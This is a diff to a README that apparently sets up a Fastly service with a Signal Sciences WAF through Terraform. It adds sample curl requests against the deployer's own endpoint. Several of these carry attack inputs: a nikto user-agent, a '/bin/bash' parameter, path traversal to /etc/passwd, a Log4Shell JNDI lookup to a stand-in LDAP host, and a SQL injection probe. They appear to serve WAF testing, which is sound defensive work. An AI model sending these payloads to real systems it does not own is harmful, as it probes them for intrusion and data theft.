@@ -20,3 +20,18 @@ export SIGSCI_EMAIL=
 export SIGSCI_TOKEN=
 terraform apply
 ```
+
+## examples
+```
+curl https://mtfew.global.ssl.fastly.net/headers
+
+curl https://mtfew.global.ssl.fastly.net/headers -H 'user-agent: nikto'
+
+curl 'https://mtfew.global.ssl.fastly.net/headers?run=/bin/bash'
+
+curl 'https://mtfew.global.ssl.fastly.net/headers?cat=../../../etc/passwd'
+
+curl https://mtfew.global.ssl.fastly.net/headers -H 'x-attack: ${jndi:ldap://foo.bar.local:9999/path}'
+
+curl 'https://mtfew.global.ssl.fastly.net/headers?user=1+ORDER+BY+11'
+```
